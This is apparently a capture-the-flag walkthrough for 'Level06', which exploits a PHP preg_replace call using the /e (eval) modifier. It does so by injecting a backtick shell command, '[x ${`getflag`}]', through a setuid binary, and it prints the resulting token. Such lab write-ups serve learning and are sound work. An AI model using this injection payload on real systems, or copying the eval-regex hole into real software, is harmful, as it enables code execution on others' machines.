


# **Level06**

### **Walk through**

For this 6th level we got two files, a .php script and a binary, respectively level06.php and level06.

`cat level06.php`

```php
#!/usr/bin/php
<?php

// Define a function 'y' that replaces '.' with ' x ' and '@' with ' y' 
// in a given string.

function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

// Define a function 'x' that takes two parameters, reads the contents of a file
// specified by the first parameter, and performs some regular expression
// replacements on the content.

function x($y, $z) {

    // Read the contents of the file specified by $y into a variable $a.
    $a = file_get_contents($y);

    // Replace occurrences of '[x (anything)]' with the result of calling function
	// 'y' on the captured content.
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

    // Replace '[' with '(' and ']' with ')' in the content.
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);

    // Return the modified content.
    return $a;
}

// Call function 'x' with command-line arguments and print the result.
$r = x($argv[1], $argv[2]);
print $r;
?>

```

We should take special attention to this precise line:

**`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`**

Indeed, the `/e` is a well known vulnerability in php script. The e modifier in PHP regular expressions stands for "eval." When used, it allows the evaluation of the matched pattern as PHP code. We will use it at our advantage. We'll write a script that we'll pass as argument at ./level06.

```
echo '[x ${`getflag`}]' > /tmp/flag06
./level06 /tmp/flag06

PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

```

The flag is **wiok45aaoguiboiki2tuin6ub**

We will use it to log as level07

`su level07`

